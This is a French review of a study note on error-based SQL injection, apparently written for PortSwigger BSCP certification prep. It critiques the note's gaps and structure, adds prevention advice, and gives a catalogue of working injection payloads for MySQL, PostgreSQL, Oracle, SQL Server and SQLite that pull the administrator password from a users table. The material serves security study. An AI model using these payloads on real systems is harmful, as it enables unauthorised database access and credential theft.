# Revue de la note "Error-based SQL Injection"

- Note relue : `BSCP-Vault/01-Server-side/SQL Injection/Error-based SQL Injection.md` (non modifiée)
- Notes voisines comparées : `SQL-injection.md`, `Blind-SQL-injection.md`, `SQL-injection-Union-Attacks.md`, et `04-Essential-skills/Payloads-cheatsheet.md`
- Statut des affirmations : tout ce qui suit est de la revue documentaire. Aucun payload n'a été rejoué contre une base dans cette session. Les payloads du catalogue sont des connaissances de référence (cheat sheet PortSwigger et pratique courante) à valider sur le lab correspondant avant de s'y fier. Les points les plus incertains sont marqués "à vérifier".

## 1. Ce qui manque ou est flou

### 1.1 Sections vides du squelette
- "Types et variantes" contient un simple point, "Comment détecter", "Pièges et points d'attention BSCP" et "Prévention" sont vides. Ce sont les quatre sections qui donnent sa valeur à la note.

### 1.2 Concepts
- Pas de définition claire des deux familles. La note les nomme (ligne 13 à 15) mais la partie "Comment exploiter" ne traite que les erreurs conditionnelles. Les erreurs verbeuses (la valeur apparaît dans le message d'erreur) ne sont pas développées dans cette note, seulement en deux lignes dans `Blind-SQL-injection.md` (section "Erreurs verbeuses").
- Absence du lab PortSwigger "Visible error-based SQL injection" (niveau Practitioner), qui est le cas d'école de la famille verbeuse. Seul le lab conditionnel est journalisé.
- Le mécanisme n'est pas expliqué : une erreur n'est exploitable que si (a) l'application la laisse passer en réponse différenciable (code 500, message, page vide) ou (b) le texte de l'erreur cite la donnée (conversion de type, XPath, parsing XML).
- Pas de distinction entre "erreur de syntaxe" (sert à détecter l'injection) et "erreur d'exécution" (sert à extraire ou à déduire). La journalisation du lab le fait implicitement (étape 1 puis étape 3), mais le principe n'est pas énoncé dans la partie théorique.

### 1.3 Méthodologie de détection
- Section vide dans la note, alors que le lab contient une bonne démarche à généraliser : apostrophe puis double apostrophe, concaténation neutre (`'||(SELECT '')||'`), test `FROM dual` pour identifier Oracle, table inexistante pour prouver que le serveur exécute du SQL.
- Manque l'arbre de décision : l'erreur est-elle affichée en clair ? Si oui, tester une conversion de type. Si seul le code HTTP change, utiliser les erreurs conditionnelles. Si rien ne change, passer aux délais puis à l'hors bande (renvoi vers `Blind-SQL-injection.md`).
- Manque la fingerprint du SGBD à partir du texte de l'erreur (voir catalogue, section 3.0).
- Manque la vérification que l'erreur dépend bien de la condition (reproductibilité vrai/faux plusieurs fois), pour éviter les faux positifs (erreur due à un WAF, à un délai, à la taille).

### 1.4 Cas par SGBD
- Le texte ne donne que `1/0`, avec une seule remarque pratique sur Oracle (ligne 49 à 51). Or, `1/0` ne provoque pas d'erreur en lecture sur MySQL (résultat NULL), et sur PostgreSQL l'optimiseur peut évaluer la division trop tôt (d'où `1/(SELECT 0)`). Ces deux pièges sont déjà dans `Blind-SQL-injection.md` mais pas dans cette note, qui laisse croire que `1/0` est universel.
- Le payload de la ligne 45 (`... FROM Users)='a`) et ceux de la ligne 33 et 34 ne précisent pas le SGBD visé. Ils fonctionnent sur SQL Server (forme de l'exemple PortSwigger), pas tels quels sur Oracle (`FROM dual`, `TO_CHAR`) ni MySQL.
- Aucun payload verbeux : CAST, CONVERT, EXTRACTVALUE, UPDATEXML, XMLTYPE sont absents de la note (voir catalogue).

### 1.5 Limites
- Longueur du message d'erreur tronquée (le conseil "vider la valeur d'origine du cookie" existe dans `Blind-SQL-injection.md` mais pas ici).
- EXTRACTVALUE et UPDATEXML MySQL tronquent à 32 caractères : utiliser `SUBSTRING` par tranches.
- Une seule ligne par sous-requête (`LIMIT 1`, `TOP 1`, `ROWNUM=1`, `FETCH FIRST 1 ROWS ONLY`), sinon l'erreur devient "more than one row" et masque la valeur.
- Les caractères interdits ou filtrés (apostrophes, espaces, mots-clés) et l'encodage dans un cookie ne sont pas mentionnés.
- Prérequis et privilèges de certaines fonctions (`UTL_INADDR`, `CTXSYS.*`) et dépendance à la version.
- Le conditionnel par erreur coûte une requête par bit ou par caractère : mentionner la recherche dichotomique (`>`, `<`) pour réduire le nombre de requêtes, ce que la ligne 45 fait mais sans l'expliquer.

### 1.6 Contre-mesures
- Section "Prévention" vide. À renseigner au minimum : requêtes paramétrées, liste blanche pour les noms de colonnes ou de tables, moindre privilège du compte applicatif (pas d'accès à `information_schema`, `sys.*`, `CTXSYS`), messages d'erreur génériques en production (journaliser côté serveur), désactivation des erreurs détaillées (`display_errors`, `customErrors`), uniformisation des réponses pour que 500 et 200 ne soient pas un oracle. Noter aussi que masquer les erreurs ne supprime pas la vulnérabilité (le blind reste exploitable par délai ou hors bande).

### 1.7 Coquilles et formulations
- Ligne 12 : "même dans un contexte blind" est correct mais la phrase est lourde. Une formulation plus claire : "les messages d'erreur permettent de déduire ou de lire des données".
- Ligne 14 : "induire en erreur une réponse d'erreur spécifique" est maladroit, et "exporession" est une faute de frappe.
- Métadonnées : `niveau: apprentice` alors que le lab réalisé est Practitioner. Les cases à cocher de la section "Labs" sont cohérentes avec cela (seul Practitioner est coché) mais le niveau de l'en-tête non.
- Ligne 96 et suivantes : casse variable de `administrator` / `Administrator`. À harmoniser (le lab utilise `administrator`).

## 2. Superflu, redondant ou hors sujet

- Doublon avec `Blind-SQL-injection.md` : la section "Blind SQLi - Réponses conditionnelles avec erreurs" décrit déjà le principe et fournit des payloads par moteur (Oracle, SQL Server, PostgreSQL, MySQL), et la section "Erreurs verbeuses" donne CAST et EXTRACTVALUE. Recommandation : faire de la note Error-based la référence unique pour les erreurs (principe, payloads, labs) et ne garder dans la note Blind qu'un résumé de deux lignes avec un lien. Le tableau "Syntaxes par moteur" de la note Blind reste utile et doit être référencé, pas recopié.
- Lignes 32 à 41 (exemple `xyz' AND (SELECT CASE WHEN (1=2) ...`) et lignes 91 à 93 (étape 3 du lab) expliquent deux fois la même chose avec le mot-clé `CASE`. Garder la version du lab (testée, Oracle) et réduire la version théorique à une phrase.
- Lignes 67 à 73 : l'énoncé du lab est une traduction complète de la consigne PortSwigger. Un résumé de deux lignes (point d'injection, but, SGBD trouvé) suffit.
- Lignes 49 à 51 : "connaissance générale, non issue de votre texte" est une remarque de rédaction à retirer. Le contenu (Oracle exige `FROM DUAL` et `TO_CHAR(1/0)`) doit être intégré proprement dans une table par SGBD.
- Lignes 76 à 83 (étape 1 du lab) : le raisonnement de fingerprint est précieux, mais il appartient à "Comment détecter". Le déplacer et garder dans le journal uniquement la suite de payloads utilisés.
- Lignes 104 à 117 (Intruder, lecture des résultats) : redondant avec "Automatiser avec Burp Intruder" dans `Blind-SQL-injection.md`. Garder seulement ce qui est spécifique ici (statut 500 comme oracle, colonne Status) et renvoyer au reste. Un lien vers `[[Using-Burp-Suite]]` existe déjà.
- Liens : `[[Access-control]]` et `[[Authentication]]` sont sans rapport direct avec l'erreur SQL (seul le login final du lab touche à l'authentification). Les remplacer par `[[SQL-injection]]`, `[[Blind-SQL-injection]]`, `[[SQL-injection-Union-Attacks]]`. Ajouter l'URL de la cheat sheet PortSwigger comme dans les notes voisines.
- Le niveau de détail "pas à pas Intruder" est à garder dans le journal de lab, pas dans la théorie.

## 3. Catalogue de payloads error-based par SGBD

Conventions :
- `'` ferme une chaîne dans un contexte de valeur textuelle (cookie `TrackingId`, paramètre `category`). En contexte numérique, retirer les apostrophes.
- `-- ` : commentaire ; MySQL exige un espace après `--` (ou `#`). Dans une URL ou un cookie, encoder l'espace et les caractères spéciaux.
- `cond` : condition booléenne à tester. `T` : table cible, `C` : colonne cible.
- Exemple de lab : le point d'injection est le cookie `TrackingId=xyz...` (une seule ligne retournée à la fois).
- Tous les payloads sont à utiliser uniquement sur les labs ou sur une cible autorisée, en lecture seule.

### 3.0 Reconnaître le SGBD à partir du message d'erreur (verbeux)
| Indice dans le message | SGBD probable |
|---|---|
| `You have an error in your SQL syntax ... near`, `XPATH syntax error: '...'` | MySQL ou MariaDB |
| `ERROR: invalid input syntax for type integer: "..."`, `argument of AND must be type boolean` | PostgreSQL |
| `ORA-01722`, `ORA-00933`, `ORA-31011`, `ORA-29257` | Oracle |
| `Conversion failed when converting the nvarchar value '...' to data type int`, `Unclosed quotation mark after the character string` | Microsoft SQL Server |
| `SQLITE_ERROR`, `unrecognized token`, `near "...": syntax error` | SQLite |

### 3.1 MySQL et MariaDB

Contexte : MySQL ne laisse pas fuiter la valeur via une conversion de type classique. On passe par des fonctions XML qui échouent en citant l'argument (XPath), ou par des astuces de comptage.

1. EXTRACTVALUE (verbeux, MySQL 5.1 et suivants, MariaDB aussi)
   - Payload : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)))-- `
   - Signal : `XPATH syntax error: '~<valeur>'`. Le préfixe `0x7e` (`~`) force l'erreur XPath.
   - Limite : environ 32 caractères affichés. Utiliser `SUBSTRING((SELECT ...),1,31)`, puis `SUBSTRING((SELECT ...),32,31)`.
2. UPDATEXML (verbeux, équivalent)
   - Payload : `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator' LIMIT 1)),1)-- `
   - Même signal et même limite que EXTRACTVALUE. Utile si l'une des deux fonctions est filtrée.
3. Double requête avec `FLOOR(RAND())` (verbeux, ancien mais encore vu en lab)
   - Payload : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- `
   - Signal : `Duplicate entry '<valeur>~1' for key 'group_key'`. Comportement dépendant de la version (à vérifier).
4. Agrégation et sous-requête multi-lignes (conditionnel, pas verbeux)
   - Payload : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- `
   - Signal : erreur "Subquery returns more than 1 row" si `cond` est vraie, page normale sinon. C'est la forme présente dans `Blind-SQL-injection.md`.
   - Remarque : `1/0` seul renvoie NULL en lecture, il ne déclenche pas d'erreur (hors modes stricts d'écriture). Ne pas le réutiliser tel quel.
5. Variantes conditionnelles possibles
   - `' AND (SELECT CASE WHEN (cond) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- ` (erreur "more than 1 row" quand `cond` est vraie).
   - Extraction : `cond` = `SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'`.
6. Autres fonctions citées dans la littérature (à vérifier selon la version) : `GTID_SUBSET`, `JSON_KEYS`, `EXP(~(SELECT * FROM (SELECT ...)x))` (débordement de BIGINT). Version-dépendantes, non recommandées en première intention.

Exemple de lab type PortSwigger (verbeux) : un paramètre ou cookie reflète l'erreur. Vider la valeur du cookie, injecter la forme 1, lire `XPATH syntax error: '~...'`, extraire la valeur par tranches de 31 caractères.

### 3.2 PostgreSQL

Contexte : la conversion de type `CAST` vers `int` échoue en citant la chaîne, ce qui fait fuiter la donnée dans le message.

1. CAST vers entier (verbeux)
   - Détection du contexte : `' AND CAST((SELECT 1) AS int)-- ` renvoie `argument of AND must be type boolean, not type integer`. Cela confirme PostgreSQL et le contexte booléen.
   - Payload : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- `
   - Signal : `ERROR: invalid input syntax for type integer: "administrator"`.
   - Mot de passe : `' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)-- `
2. Opérateur `::` (équivalent syntaxique)
   - Payload : `' AND 1=(SELECT username FROM users LIMIT 1)::int-- `
   - Utile si le mot `CAST` est filtré.
3. Plusieurs lignes d'un coup (verbeux)
   - Payload : `' AND 1=CAST((SELECT string_agg(username,',') FROM users) AS int)-- `
   - Moins fiable à cause de la troncature du message. Préférer `LIMIT 1 OFFSET n`.
4. Variante conditionnelle (division par zéro)
   - Payload : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)-- `
   - Signal : `division by zero` si `cond` est vraie. `(SELECT 0)` empêche l'optimiseur de plier la constante à la planification.
   - Variante par conversion : `CASE WHEN (cond) THEN CAST('a' AS int) ELSE 1 END`.
5. Limite : avec une valeur d'origine longue (cookie), le message est tronqué. Vider la valeur du `TrackingId` pour gagner de la place.

Exemple de lab type PortSwigger : "Visible error-based SQL injection" (cookie `TrackingId`). Étapes : (a) ajouter `'` et observer l'erreur SQL affichée, (b) tester `' AND CAST((SELECT 1) AS int)-- `, (c) corriger en `' AND 1=CAST((SELECT 1) AS int)-- `, (d) remplacer par `SELECT username FROM users LIMIT 1`, puis `SELECT password ...`. Si le message est tronqué, supprimer la valeur d'origine du cookie. Le journal de la note n'a pas encore ce lab.

### 3.3 Oracle

Contexte : tout `SELECT` exige `FROM dual`. La concaténation se fait avec `||`. Pas de `LIMIT` : utiliser `ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY`.

1. XMLTYPE (verbeux)
   - Payload : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT password FROM users WHERE username='administrator' AND ROWNUM=1)||CHR(62))) FROM dual)-- `
   - Signal : `ORA-31011: XML parsing failed` avec la valeur citée dans le détail (`LPX-00...`). `CHR(60)` est `<` et `CHR(58)` est `:`, ce qui produit un nom XML invalide.
   - Version plus simple : `' || (SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual) || '`.
2. `UTL_INADDR.GET_HOST_NAME` (verbeux, à vérifier selon version et listes de contrôle d'accès réseau)
   - Payload : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- `
   - Signal : `ORA-29257: host <valeur> unknown`.
3. `CTXSYS.DRITHSX.SN` (verbeux, selon droits)
   - Payload : `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- `
   - Signal : `ORA-20000: Oracle Text error` avec la valeur. Dépend de la présence du composant Oracle Text.
4. `TO_NUMBER` ou `CAST` en nombre : `ORA-01722: invalid number` signale l'erreur mais, selon les versions, ne cite pas la valeur. Utile uniquement comme oracle conditionnel.
5. Variante conditionnelle (celle du lab de la note)
   - Payload : `'||(SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
   - Signal : `ORA-01476: divisor is equal to zero` (HTTP 500 dans le lab) si `cond` est vraie.
   - Extraction : `cond` = `SUBSTR(password,1,1)='a'` avec `FROM users WHERE username='administrator'`. Longueur : `LENGTH(password)>n`.
   - `TO_CHAR` est nécessaire pour que le type de retour du `CASE` reste cohérent (chaîne).

### 3.4 Microsoft SQL Server

Contexte : la conversion de type `CONVERT` ou `CAST` vers `int` fait fuiter la chaîne. `TOP 1` remplace `LIMIT 1`. Commentaire `--`.

1. CONVERT (verbeux)
   - Payload : `' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users WHERE username='administrator'))-- `
   - Signal : `Conversion failed when converting the nvarchar value '<valeur>' to data type int.`
2. CAST (équivalent)
   - Payload : `' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- `
3. Version et utilisateur
   - `' AND 1=CONVERT(int,@@version)-- ` ; `' AND 1=CONVERT(int,SYSTEM_USER)-- `
4. Plusieurs lignes : `' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- ` (SQL Server 2017 et suivants). Pour les versions plus anciennes : `(SELECT name+',' FROM sys.tables FOR XML PATH(''))`.
5. Énumération classique par erreurs de regroupement (anciennes versions, lab ou applications patrimoniales) : `' HAVING 1=1-- ` puis `' GROUP BY <colonne> HAVING 1=1-- ` qui révèlent progressivement les noms `table.colonne`.
6. Variante conditionnelle (division par zéro)
   - Payload : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)-- `
   - Signal : `Divide by zero error encountered` si `cond` est vraie.
   - Requêtes empilées possibles : `'; IF (cond) SELECT 1/0-- `. L'encodage du `;` dans un cookie est `%3B`.
   - Extraction : `cond` = `SUBSTRING((SELECT TOP 1 password FROM users WHERE username='administrator'),1,1)='a'`.

### 3.5 SQLite (pertinent surtout pour des applications locales ou des CTF)

Contexte : il n'existe pas de fonction XML ni de conversion qui cite la valeur. L'erreur sert uniquement d'oracle conditionnel, et `CAST` ne lève pas d'erreur (retourne 0).

1. Variante conditionnelle (à vérifier selon la version)
   - Payload : `' AND (SELECT CASE WHEN (cond) THEN abs(-9223372036854775808) ELSE 1 END)=1-- `
   - Signal : `integer overflow` quand `cond` est vraie.
2. Autre oracle : `json('{')` ou `json('x')` dans la branche vraie du `CASE` pour déclencher `malformed JSON` (si l'extension JSON1 est compilée).
3. À éviter : `randomblob(<très grand>)` ("string or blob too big") consomme de la mémoire, c'est un risque de déni de service et donc exclu.
4. Si l'application affiche les erreurs en clair, l'information utile est limitée à la syntaxe et aux noms de colonnes (`no such column: <nom>`), ce qui reste exploitable pour l'énumération du schéma.

### 3.6 Récapitulatif synthétique

| SGBD | Fonction d'erreur verbeuse | Oracle conditionnel | Une seule ligne |
|---|---|---|---|
| MySQL ou MariaDB | `EXTRACTVALUE`, `UPDATEXML` (32 caractères) | `IF(cond,(SELECT ... plusieurs lignes),'a')` | `LIMIT 1` |
| PostgreSQL | `CAST(... AS int)` ou `::int` | `CASE WHEN cond THEN 1/(SELECT 0) ELSE 1 END` | `LIMIT 1` |
| Oracle | `XMLTYPE`, `UTL_INADDR`, `CTXSYS.DRITHSX.SN` | `CASE WHEN cond THEN TO_CHAR(1/0) ELSE '' END FROM dual` | `ROWNUM=1` |
| SQL Server | `CONVERT(int,...)`, `CAST(... AS int)` | `CASE WHEN cond THEN 1/0 ELSE 1 END` | `TOP 1` |
| SQLite | aucune fiable | `CASE WHEN cond THEN abs(-9223372036854775808) ELSE 1 END` | `LIMIT 1` |

### 3.7 Méthode de vérification propre (pour chaque famille)
- Verbeux : le signal qui confirme est la présence littérale de la valeur injectée dans le texte de l'erreur. Sans cette valeur, la preuve n'est pas faite (c'est seulement un oracle).
- Conditionnel : envoyer la paire (condition vraie, condition fausse) et vérifier au moins trois fois que la différence (code 500 contre 200, taille, message) est stable et dépend de la condition. Ajouter un témoin (`1=1` et `1=2`) à chaque série.
- Toujours en lecture seule, une seule ligne, sans énumération massive. Pour une preuve de concept, un seul caractère ou le nom de l'utilisateur de la base suffit.
- Conserver la requête et la réponse brutes dans `evidence/` avec horodatage, et l'outil utilisé (Burp Repeater ou Intruder) avec la commande exacte, conformément aux règles du dossier.

## 4. Propositions de plan pour la note (sans modification appliquée)
1. En bref : deux familles (verbeuse et conditionnelle) avec une phrase chacune.
2. Types et variantes : tableau 3.6 ci-dessus.
3. Comment détecter : arbre de décision et fingerprint par message d'erreur.
4. Comment exploiter : verbeux (par SGBD), puis conditionnel (par SGBD), puis automatisation.
5. Pièges BSCP : troncature, une ligne, cookie et encodage, `1/0` non universel, statut 500 comme oracle, vider la valeur d'origine du cookie.
6. Prévention : liste de la section 1.6.
7. Labs : ajouter "Visible error-based SQL injection" au journal, corriger `niveau`, et résumer l'énoncé du lab déjà fait.
8. Liens : `[[SQL-injection]]`, `[[Blind-SQL-injection]]`, `[[SQL-injection-Union-Attacks]]`, `[[Using-Burp-Suite]]`, `[[Payloads-cheatsheet]]` et l'URL de la cheat sheet PortSwigger.
9. Mettre à jour `Payloads-cheatsheet.md` (lignes 142 à 145) avec les entrées MySQL (EXTRACTVALUE, UPDATEXML), SQL Server (CONVERT) et Oracle (XMLTYPE), en conservant sa mention "non rejoués sur une base" tant que les labs ne sont pas faits.
